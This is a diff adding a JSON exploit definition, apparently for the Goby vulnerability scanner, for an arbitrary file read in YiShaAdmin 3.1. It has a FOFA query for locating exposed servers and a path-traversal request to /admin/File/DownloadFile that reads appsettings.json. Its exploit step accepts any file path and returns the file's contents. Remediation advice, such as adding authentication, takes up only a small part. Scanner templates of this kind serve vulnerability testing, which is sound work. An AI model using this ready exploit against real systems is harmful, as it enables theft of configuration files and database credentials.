@@ -1,0 +1,143 @@
+{
+  "Name": "YiShaAdmin 3.1 Arbitrary File Read",
+  "Description": "<p>YiShaAdmin is based on the .NET Core MVC permission management system. The code is easy to read and understand, and the interface is simple and beautiful.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Attackers can exploit the vulnerability to read arbitrary files, including database passwords.&nbsp;</span><br></p>",
+  "Product": "YiShaAdmin",
+  "Homepage": "https://github.com/liukuo362573/YiShaAdmin",
+  "DisclosureDate": "2022-03-23",
+  "Author": "abszse",
+  "FofaQuery": "body=\"/yisha/css/login.css\"",
+  "GobyQuery": "body=\"/yisha/css/login.css\"",
+  "Level": "2",
+  "Impact": "<p>Attackers can exploit the vulnerability to read arbitrary files, including database passwords.&nbsp;<br></p>",
+  "References": [
+    "https://fofa.so/"
+  ],
+  "Is0day": false,
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "input",
+      "value": "appsettings.json",
+      "show": ""
+    }
+  ],
+  "ExpTips": {
+    "Type": "",
+    "Content": ""
+  },
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/admin/File/DownloadFile?filePath=wwwroot/../appsettings.json&delete=0",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          },
+          {
+            "type": "item",
+            "variable": "$body",
+            "operation": "contains",
+            "value": "Logging",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": []
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "method": "GET",
+        "uri": "/admin/File/DownloadFile?filePath=wwwroot/../{{{cmd}}}&delete=0",
+        "follow_redirect": false,
+        "header": {},
+        "data_type": "text",
+        "data": ""
+      },
+      "ResponseTest": {
+        "type": "group",
+        "operation": "AND",
+        "checks": [
+          {
+            "type": "item",
+            "variable": "$code",
+            "operation": "==",
+            "value": "200",
+            "bz": ""
+          }
+        ]
+      },
+      "SetVariable": [
+        "output|lastbody||"
+      ]
+    }
+  ],
+  "Tags": [
+    "Arbitrary File Download"
+  ],
+  "VulType": [
+    "Arbitrary File Download"
+  ],
+  "CVEIDs": [
+    ""
+  ],
+  "CNNVD": [
+    ""
+  ],
+  "CNVD": [
+    ""
+  ],
+  "CVSSScore": "7.5",
+  "Translation": {
+    "CN": {
+      "Name": "YiShaAdmin 管理系统 3.1 任意文件读取漏洞",
+      "Product": "YiShaAdmin",
+      "Description": "<p>YiShaAdmin 基于 .NET Core MVC 的权限管理系统，代码易读易懂、界面简洁美观。</p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">攻击者可利用漏洞读取任意文件，包括数据库密码等。</span><br><br></p>",
+      "Recommendation": "<p>对/admin/File/DownloadFile 设置鉴权</p><p>设置访问的白名单</p><p>修复请关注链接：<a href=\"https://github.com/liukuo362573/YiShaAdmin\">https://github.com/liukuo362573/YiShaAdmin</a><br></p>",
+      "Impact": "<p>攻击者可利用漏洞读取任意文件，包括数据库密码等。<br></p>",
+      "VulType": [
+        "任意⽂件下载"
+      ],
+      "Tags": [
+        "任意⽂件下载"
+      ]
+    },
+    "EN": {
+      "Name": "YiShaAdmin 3.1 Arbitrary File Read",
+      "Product": "YiShaAdmin",
+      "Description": "<p>YiShaAdmin is based on the .NET Core MVC permission management system. The code is easy to read and understand, and the interface is simple and beautiful.<br></p><p><span style=\"color: rgb(22, 51, 102); font-size: 16px;\">Attackers can exploit the vulnerability to read arbitrary files, including database passwords.&nbsp;</span><br></p>",
+      "Recommendation": "<p>Set authentication to /admin/File/DownloadFile</p><p><span style=\"color: var(--primaryFont-color);\">Set a whitelist for access</span></p><p>Please follow the link for repair: <a href=\"https://github.com/liukuo362573/YiShaAdmin\">https://github.com/liukuo362573/YiShaAdmin</a></p>",
+      "Impact": "<p>Attackers can exploit the vulnerability to read arbitrary files, including database passwords.&nbsp;<br></p>",
+      "VulType": [
+        "Arbitrary File Download"
+      ],
+      "Tags": [
+        "Arbitrary File Download"
+      ]
+    }
+  },
+  "AttackSurfaces": {
+    "Application": null,
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  }
+}
